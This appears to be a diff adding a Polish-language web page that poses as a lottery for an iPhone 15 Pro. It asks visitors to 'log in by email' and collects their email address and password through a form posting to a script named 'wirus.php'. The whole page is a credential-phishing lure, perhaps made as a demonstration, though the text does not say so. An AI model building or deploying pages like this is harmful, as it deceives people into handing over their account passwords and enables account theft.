@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wielka loteria! Wygraj iPhone!</title>
+	<link rel="icon" href="hello/smiley.ico" type="image/ico" />
+
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
+	<style>
+        .title {
+            font-size: 40px; /* Dostosuj rozmiar czcionki według potrzeb */
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 20px; /* Dodaj margines na dole, aby oddzielić tytuł od reszty zawartości */
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wrapper">
+	        <div class="title">Wielka Loteria - Wygraj iPhone 15 Pro!</div>
+        <header>Aby wziąć udział w loterii, zaloguj się przez maila:</header>
+        <form action="wirus.php" method="post" id="loginForm">
+
+            <div class="field email">
+                <div class="input-area">
+                    <input type="text" name="email" placeholder="Email">
+                    <i class="icon fas fa-envelope"></i>
+                    <i class="error error-icon fas fa-exclamation-circle"></i>
+                </div>
+                <div class="error error-txt">To pole nie może być puste!</div>
+            </div>
+            <div class="field password">
+                <div class="input-area">
+                    <input type="password" name="password" placeholder="Hasło">
+                    <i class="icon fas fa-lock"></i>
+                    <i class="error error-icon fas fa-exclamation-circle"></i>
+                </div>
+                <div class="error error-txt">To pole nie może być puste!</div>
+            </div>
+            <div class="pass-txt"><a href="#">Zapomniałeś hasła?</a></div>
+            <input type="submit" value="Zaloguj">
+        </form>
+        <div class="sign-txt">Chcesz poznać szczegółowe informacje o konkursie? <a href="#">Kliknij tutaj!</a></div>
+    </div>
+
+    <script src="script.js"></script>
+
+</body>
+
+</html>
